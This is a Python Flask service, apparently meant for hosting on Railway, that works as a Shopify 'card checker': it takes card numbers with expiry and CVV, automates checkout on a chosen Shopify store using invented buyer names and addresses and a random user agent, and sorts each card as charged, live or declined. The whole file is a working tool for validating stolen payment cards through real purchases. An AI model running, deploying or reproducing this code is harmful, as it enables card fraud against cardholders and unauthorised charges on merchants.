#!/usr/bin/env python3
# SHOPIFY CARD CHECKER API - RAILWAY DEPLOYMENT

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import httpx
import random
import re
import json
import os
from urllib.parse import urlparse
from fake_useragent import UserAgent
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================================
# SHOPIFY CHECKER CLASS
# ============================================================

class ShopifyChecker:
    def __init__(self):
        self.user_agent = UserAgent().random
        self.session = None
    
    def find_between(self, s, start, end):
        try:
            if start in s and end in s:
                return (s.split(start))[1].split(end)[0]
            return ""
        except:
            return ""
    
    async def get_random_info(self):
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        phone = random.choice(["2025550199", "3105551234", "4155559876", "6175550123", "9718081573", "2125559999"])
        
        return {
            "fname": first_name, "lname": last_name, "email": email, "phone": phone,
            "add1": address["add1"], "city": address["city"],
            "state": address["state"], "state_short": address["state_short"],
            "zip": address["zip"]
        }
    
    def format_response(self, status, message, order_id=None):
        if status == "CHARGED":
            formatted = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: ORDER_PLACED"
            if order_id:
                formatted += f" | Order ID: {order_id}"
            return {"status": "CHARGED", "formatted_response": formatted, "response": "ORDER_PLACED"}
        elif status == "APPROVED":
            if "insufficient" in message.lower() or "balance" in message.lower():
                return {"status": "APPROVED", "formatted_response": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INSUFFICIENT_FUNDS", "response": "INSUFFICIENT_FUNDS"}
            elif "cvv" in message.lower() or "cvc" in message.lower():
                return {"status": "APPROVED", "formatted_response": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INCORRECT_CVC", "response": "INCORRECT_CVC"}
            elif "otp" in message.lower() or "3d" in message.lower():
                return {"status": "APPROVED", "formatted_response": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: OTP_REQUIRED", "response": "OTP_REQUIRED"}
            else:
                return {"status": "APPROVED", "formatted_response": f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: {message[:50]}", "response": message[:50]}
        else:
            return {"status": "DECLINED", "formatted_response": "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CARD_DECLINED", "response": "CARD_DECLINED"}

    async def check_card(self, site_url, card):
        async with httpx.AsyncClient(follow_redirects=True, timeout=30.0) as session:
            try:
                parts = card.split('|')
                if len(parts) != 4:
                    return {"status": "ERROR", "formatted_response": "❌ Invalid format", "response": "INVALID_FORMAT"}
                
                cc, mon, year, cvv = parts
                
                # Get product
                product_header = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 'user-agent': self.user_agent}
                product_response = await session.get(site_url + '/products.json', headers=product_header)
                if product_response.status_code != 200:
                    return {"status": "ERROR", "formatted_response": "❌ Product fetch failed", "response": "PRODUCT_FETCH_FAILED"}
                
                products_data = product_response.json()
                product = products_data['products'][0]
                variant_id = product['variants'][0]['id']
                product_handle = product['handle']
                
                # Add to cart
                await session.get(site_url + '/cart.js', headers=product_header)
                add_data = {'id': str(variant_id), 'quantity': '1', 'form_type': 'product'}
                response = await session.post(site_url + '/cart/add.js', headers=product_header, data=add_data)
                if response.status_code != 200:
                    return {"status": "ERROR", "formatted_response": "❌ Cart add failed", "response": "CART_ADD_FAILED"}
                
                # Get cart token
                cart_response = await session.get(f"{site_url}/cart.js", headers=product_header)
                cart_data = cart_response.json()
                token = cart_data['token']
                
                # Checkout
                checkout_headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site_url,
                    'referer': f"{site_url}/cart",
                    'user-agent': self.user_agent,
                }
                await session.get(f"{site_url}/checkout", headers=checkout_headers)
                checkout_response = await session.post(f"{site_url}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'})
                response_text = checkout_response.text
                
                # Extract tokens
                session_token_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', response_text)
                if not session_token_match:
                    return {"status": "ERROR", "formatted_response": "❌ Token extraction failed", "response": "TOKEN_FAILED"}
                
                session_token = session_token_match.group(1)
                queue_token = self.find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = self.find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
                paymentMethodIdentifier = self.find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                
                # Get random info
                info = await self.get_random_info()
                fname, lname, email, phone = info["fname"], info["lname"], info["email"], info["phone"]
                add1, city, state_short, zip_code = info["add1"], info["city"], info["state_short"], info["zip"]
                
                # Create payment session
                session_created = False
                sessionid = None
                for endpoint in ["https://deposit.us.shopifycs.com/sessions", "https://checkout.shopifycs.com/sessions"]:
                    try:
                        headers = {'accept': 'application/json', 'content-type': 'application/json', 'user-agent': self.user_agent}
                        json_data = {
                            'credit_card': {'number': cc, 'month': mon, 'year': year, 'verification_value': cvv, 'name': f"{fname} {lname}"},
                            'payment_session_scope': urlparse(site_url).netloc
                        }
                        resp = await session.post(endpoint, headers=headers, json=json_data)
                        if resp.status_code == 200:
                            data = resp.json()
                            if "id" in data:
                                sessionid = data["id"]
                                session_created = True
                                break
                    except:
                        continue
                
                if not session_created:
                    return {"status": "ERROR", "formatted_response": "❌ Session creation failed", "response": "SESSION_FAILED"}
                
                # GraphQL submission
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                graphql_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': site_url,
                    'user-agent': self.user_agent,
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-source-id': token,
                }
                
                random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
                
                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {'streetAddress': {'address1': add1, 'address2': '', 'city': city, 'countryCode': 'US', 'postalCode': zip_code, 'company': '', 'firstName': fname, 'lastName': lname, 'zoneCode': state_short, 'phone': phone}},
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': [], 'sellingPlanId': None}},
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True}
                                }]
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': paymentMethodIdentifier, 'sessionId': sessionid, 'billingAddress': {'streetAddress': {'address1': add1, 'address2': '', 'city': city, 'countryCode': 'US', 'postalCode': zip_code, 'company': '', 'firstName': fname, 'lastName': lname, 'zoneCode': state_short, 'phone': phone}}, 'cardSource': None}},
                                    'amount': {'any': True},
                                    'dueAt': None
                                }],
                                'billingAddress': {'streetAddress': {'address1': add1, 'address2': '', 'city': city, 'countryCode': 'US', 'postalCode': zip_code, 'company': '', 'firstName': fname, 'lastName': lname, 'zoneCode': state_short, 'phone': phone}}
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                                'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
                                'marketingConsent': [{'email': {'value': email}}]
                            },
                            'tip': {'tipLines': []},
                            'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}},
                            'note': {'message': None, 'customAttributes': []},
                            'nonNegotiableTerms': None
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'analytics': {'requestUrl': f'{site_url}/checkouts/cn/{token}', 'pageId': random_page_id}
                    },
                    'operationName': 'SubmitForCompletion'
                }
                
                graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                if graphql_response.status_code != 200:
                    return {"status": "ERROR", "formatted_response": "❌ GraphQL failed", "response": "GRAPHQL_FAILED"}
                
                result_data = graphql_response.json()
                completion = result_data.get('data', {}).get('submitForCompletion', {})
                
                if completion.get('__typename') == 'SubmitSuccess':
                    receipt = completion.get('receipt', {})
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return self.format_response("CHARGED", "ORDER_PLACED", receipt.get('token'))
                    elif receipt.get('__typename') == 'ActionRequiredReceipt':
                        return self.format_response("APPROVED", "OTP_REQUIRED")
                    elif receipt.get('__typename') == 'FailedReceipt':
                        error = receipt.get('processingError', {})
                        return self.format_response("DECLINED", error.get('code', 'CARD_DECLINED'))
                
                elif completion.get('__typename') == 'SubmitRejected':
                    errors = completion.get('errors', [])
                    error_codes = [e.get('code', '') for e in errors if 'code' in e]
                    for code in error_codes:
                        if 'INSUFFICIENT_FUNDS' in code:
                            return self.format_response("APPROVED", "INSUFFICIENT_FUNDS")
                        elif 'INCORRECT_CVC' in code:
                            return self.format_response("APPROVED", "INCORRECT_CVC")
                        elif 'OTP' in code or '3D_SECURE' in code:
                            return self.format_response("APPROVED", "OTP_REQUIRED")
                    return self.format_response("DECLINED", "CARD_DECLINED")
                
                else:
                    return self.format_response("DECLINED", "CARD_DECLINED")
                
            except Exception as e:
                return {"status": "ERROR", "formatted_response": f"❌ Error: {str(e)[:100]}", "response": str(e)[:100]}

# ============================================================
# FLASK API
# ============================================================

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "name": "Shopify Card Checker API",
        "version": "1.0",
        "status": "online",
        "endpoints": {
            "/check": "POST - Check card on Shopify site",
            "/health": "GET - Health check"
        }
    })

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route("/check", methods=["POST"])
def check_shopify():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Missing JSON"}), 400
        
        site_url = data.get("site") or data.get("shop_url")
        if not site_url:
            return jsonify({"error": "Missing 'site' parameter"}), 400
        
        card = data.get("cc") or data.get("card")
        if not card:
            return jsonify({"error": "Missing 'cc' parameter"}), 400
        
        if not re.match(r"^\d+\|\d+\|\d+\|\d+$", card):
            return jsonify({"error": "Invalid format. Use: CC|MM|YY|CVV"}), 400
        
        checker = ShopifyChecker()
        result = asyncio.run(checker.check_card(site_url, card))
        
        return jsonify({
            "site": site_url,
            "cc": card,
            "result": result,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print(f"🔥 Shopify API running on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False)
